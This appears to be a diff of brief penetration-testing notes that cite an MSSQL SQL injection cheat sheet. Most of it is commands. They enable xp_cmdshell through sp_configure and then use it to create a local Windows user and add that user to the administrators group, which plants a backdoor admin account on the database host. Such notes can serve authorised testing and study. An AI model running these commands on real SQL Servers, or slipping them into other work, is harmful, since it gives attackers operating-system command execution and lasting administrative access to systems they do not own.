@@ -1,14 +1,21 @@
 http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 
 
-EXEC sp_configure 'show advanced options', 1
+
+```
+exec sp_configure 'show advanced options', 1
 go
-RECONFIGURE
+reconfigure
 go
-EXEC sp_configure 'xp_cmdshell', 1
+exec sp_configure 'xp_cmdshell', 1
 go
-RECONFIGURE
+reconfigure
 go
+xp_cmdshell "net user gary password /add"
+go
+xp_cmdshell "net localgroup administrators gary /add"
+go
+```
 
 
 
